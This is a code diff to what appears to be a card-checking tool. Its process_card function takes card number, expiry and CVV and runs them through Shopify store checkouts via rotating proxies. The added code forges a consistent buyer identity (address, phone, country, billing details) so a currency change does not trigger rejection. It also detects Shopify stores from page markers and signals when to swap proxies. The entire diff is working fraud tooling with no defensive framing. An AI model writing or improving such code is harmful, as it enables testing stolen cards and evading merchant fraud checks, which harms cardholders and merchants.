@@ -726,6 +726,42 @@ def _billing_street_dict(street, address2, city, country_code, s_zip,
     }
 
 
+def _rebuild_identity_for_currency(proposal_variables, new_currency, first, last):
+    """BUYER_IDENTITY retry: presentment currency and buyer country/address MUST
+    move together — a new currency with the old country gets rejected again."""
+    addr = pick_addr(new_currency)
+    cc = addr["countryCode"]
+    phone = addr["phone"]; street = addr["address1"]
+    city = addr["city"]; state = addr["zoneCode"]; s_zip = addr["postalCode"]
+    try:
+        dest = (proposal_variables["delivery"]["deliveryLines"][0]
+                ["destination"]["partialStreetAddress"])
+        dest.update({"address1": street, "address2": "", "city": city,
+                     "countryCode": cc, "postalCode": s_zip,
+                     "firstName": first, "lastName": last,
+                     "zoneCode": state, "phone": phone})
+    except Exception:
+        pass
+    try:
+        proposal_variables["payment"]["billingAddress"]["streetAddress"] = \
+            dict(_billing_street_dict(street, "", city, cc, s_zip, first, last, state, phone))
+    except Exception:
+        pass
+    bi = proposal_variables.get("buyerIdentity") or {}
+    cust = bi.get("customer") or {}
+    cust["presentmentCurrency"] = new_currency
+    cust["countryCode"] = cc
+    bi["phoneCountryCode"] = cc
+    bi["phone"] = phone
+    mm = bi.get("messagingMarketingConsent") or {}
+    if isinstance(mm, dict):
+        mm["countryCode"] = cc; mm["disclosureCountryCode"] = cc
+    sp = bi.get("shopPayOptInPhone") or {}
+    if isinstance(sp, dict):
+        sp["countryCode"] = cc
+    return new_currency, cc
+
+
 def _payment_method_wrapper(direct_payment_method):
     return {
         "directPaymentMethod": direct_payment_method,
@@ -1645,25 +1681,42 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 warm_headers = build_headers(profile, ourl, for_document=True)
                 xhr_headers = build_headers(profile, ourl, for_document=False)
 
+            _root_html = ""
             try:
-                await session.get(ourl, headers=warm_headers, proxy=proxy,
-                                  timeout=8, allow_redirects=True)
+                _warm = await session.get(ourl, headers=warm_headers, proxy=proxy,
+                                          timeout=8, allow_redirects=True)
+                try:
+                    _root_html = _warm.text or ""
+                except Exception:
+                    pass
                 print(f"[warmup] ✅ {time.time()-t0:.2f}s root primed")
             except Exception as e:
                 print(f"[warmup] ⚠️ {str(e)[:80]}")
                 return False, "Change Proxy", gateway, variant_price_fallback, currency
 
-            # 🔥 FIX: Abort if this isn't a Shopify site
-            is_shopify = await verify_shopify_store(session, ourl, proxy, profile)
-            if is_shopify == "CONNECTION_DEAD":
-                # egress never answered a single request — proxy problem, NOT
-                # a dead store (msh deletes sites on NOT_SHOPIFY: never lie)
-                print(f"[verify] ⛔ egress dead (zero responses) → Change Proxy")
-                return False, "Change Proxy", gateway, variant_price_fallback, currency
-            if not is_shopify:
-                print(f"[verify] ❌ Not a Shopify store (meta.json/cart.js failed)")
-                return False, "NOT_SHOPIFY", gateway, variant_price_fallback, currency
-            print(f"[verify] ✅ Confirmed Shopify store")
+            # 🔥 FIX: Abort if this isn't a Shopify site — but the warmup ROOT
+            # response is the strongest evidence: *.myshopify.com hosts are
+            # Shopify by definition, and the root HTML carries Shopify markers
+            # (cdn.shopify.com / Shopify.theme / shopify-features). Only fall
+            # back to meta.json/cart.js probes when the root shows nothing.
+            _host_shopify = ourl.split("//")[1].split("/")[0].lower().endswith(".myshopify.com")
+            _root_shopify = any(m in _root_html for m in
+                                ("cdn.shopify.com", "Shopify.theme", "shopify-features",
+                                 "myshopify.com", "Shopify.cdn"))
+            if _host_shopify or _root_shopify:
+                is_shopify = True
+                print(f"[verify] ✅ Shopify via {'host' if _host_shopify else 'root markers'}")
+            else:
+                is_shopify = await verify_shopify_store(session, ourl, proxy, profile)
+                if is_shopify == "CONNECTION_DEAD":
+                    # egress never answered a single request — proxy problem, NOT
+                    # a dead store (msh deletes sites on NOT_SHOPIFY: never lie)
+                    print(f"[verify] ⛔ egress dead (zero responses) → Change Proxy")
+                    return False, "Change Proxy", gateway, variant_price_fallback, currency
+                if not is_shopify:
+                    print(f"[verify] ❌ Not a Shopify store (meta.json/cart.js failed)")
+                    return False, "NOT_SHOPIFY", gateway, variant_price_fallback, currency
+                print(f"[verify] ✅ Confirmed Shopify store")
 
             if variant_id:
                 res = await asyncio.gather(detect_store_currency(session, ourl, proxy, profile),
@@ -2089,8 +2142,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         _fix = await redetect_supported_currency(session, ourl, proxy, profile, currency)
                         if isinstance(_fix, str) and _fix and _fix != currency:
                             print(f"[currency] P1 mismatch → session currency {_fix} (was {currency})")
-                            currency = _fix
-                            proposal_variables["buyerIdentity"]["customer"]["presentmentCurrency"] = _fix
+                            currency, country_code = _rebuild_identity_for_currency(proposal_variables, _fix, firstName, lastName)
                             response, resp_text = await gql(
                                 session, "Proposal", headers, proposal_payload, proxy,
                                 checkout_html=text, checkout_origin=checkout_origin,
@@ -2127,8 +2179,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         _fix = await redetect_supported_currency(session, ourl, proxy, profile, currency)
                         if isinstance(_fix, str) and _fix and _fix != currency:
                             print(f"[currency] negotiate mismatch → session currency {_fix}")
-                            currency = _fix
-                            proposal_variables["buyerIdentity"]["customer"]["presentmentCurrency"] = _fix
+                            currency, country_code = _rebuild_identity_for_currency(proposal_variables, _fix, firstName, lastName)
                             response, resp_text = await gql(
                                 session, "Proposal", headers, proposal_payload, proxy,
                                 checkout_html=text, checkout_origin=checkout_origin,
